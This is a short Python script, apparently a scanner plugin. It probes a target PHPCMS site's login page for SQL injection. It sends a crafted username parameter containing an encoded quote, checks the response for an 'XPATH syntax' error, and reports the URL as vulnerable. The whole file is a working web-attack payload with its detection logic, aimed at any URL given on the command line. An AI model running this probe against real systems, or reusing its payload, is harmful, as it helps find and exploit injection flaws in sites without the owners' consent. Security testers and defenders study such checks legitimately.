#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
payload ='/index.php?m=menber&c=index&a=login"&dosubmit=1&username=phpcms&password=123456%26username%3d%2527%2b'
bug ="XPATH syntax"
info = "/index.php?m=menber&c=index&a=login"

def main():
    res = HttpGet(url+payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[0].find(bug)!= -1:
        print(Result+url+info);


main()
